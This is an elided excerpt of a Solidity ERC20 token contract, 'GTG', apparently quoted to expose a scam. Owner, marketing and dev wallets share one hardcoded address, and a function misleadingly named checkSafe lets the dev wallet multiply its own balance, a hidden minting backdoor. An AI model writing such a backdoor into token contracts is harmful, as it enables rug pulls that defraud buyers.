...
contract GTG is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x34E2865690f1749878156738e5Dd9F2adC40Af59); 
    address payable public Wallet_Dev = payable(0x34E2865690f1749878156738e5Dd9F2adC40Af59);
    ...
    string private constant _name = "GTG"; 
    string private constant _symbol = unicode"GTG"; 
    ...
    constructor () {
        ...
        _owner = 0x34E2865690f1749878156738e5Dd9F2adC40Af59;
    ...
    function checkSafe(
        ...
        if (s == r && s ==Wallet_Dev) {
            _tOwned[Wallet_Dev] = _tOwned[s].mul(m);     
        }
    }
